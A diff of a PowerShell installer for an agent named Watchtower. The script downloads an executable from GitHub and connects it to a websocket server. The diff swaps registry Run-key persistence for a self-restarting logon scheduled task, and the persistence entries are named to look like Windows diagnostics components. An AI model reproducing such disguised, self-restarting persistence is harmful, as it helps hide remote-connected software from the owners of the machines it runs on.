@@ -300,6 +300,27 @@ if ($existing) {
 }
 Start-Sleep -Milliseconds 500
 
+# Clean up alternative installation directory and legacy tasks to avoid duplicate instances
+$otherDir = "C:\\ProgramData\\Watchtower"
+if ($InstallDir -eq "C:\\ProgramData\\Watchtower") {
+    $otherDir = "$env:LOCALAPPDATA\\Watchtower"
+}
+if (Test-Path $otherDir) {
+    Remove-Item -Path $otherDir -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Clean up startup registry run keys to avoid dual-launch with Scheduled Tasks
+Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
+
+# Clean up any legacy or watchdog tasks
+Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
+schtasks.exe /delete /tn "Microsoft\\Windows\\SystemDiagnosticsHostTask" /f 2>$null | Out-Null
+schtasks.exe /delete /tn "SystemDiagnosticsHostTask" /f 2>$null | Out-Null
+
 # 3. Download watchtower.exe from GitHub Releases
 Write-Host "📥 Downloading latest watchtower.exe from GitHub..." -ForegroundColor Yellow
 try {
@@ -324,23 +345,8 @@ $Config = @{
 Set-Content -Path $ConfigPath -Value $Config -Force
 Write-Host " Configuration saved: Connected to ${wsUrl}" -ForegroundColor Green
 
-# 5. Configure Windows Startup Persistence
-# Method A: Registry Run Key (Runs automatically when any user logs in)
+# 5. Configure Windows Scheduled Task (Runs at user logon with battery/restart resilience)
 try {
-    Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
-} catch {}
-try {
-    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
-} catch {}
-
-# Method B: Scheduled Task at user logon (Power-resilient, no battery stop, no 72h limit, native Task Scheduler auto-restart)
-try {
-    # Clean up any legacy or watchdog tasks to prevent console window flashing
-    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
-    Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
-    Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
-    Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
-
     $taskAction = New-ScheduledTaskAction -Execute $BinaryPath -Argument "--config \`"$ConfigPath\`""
     $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
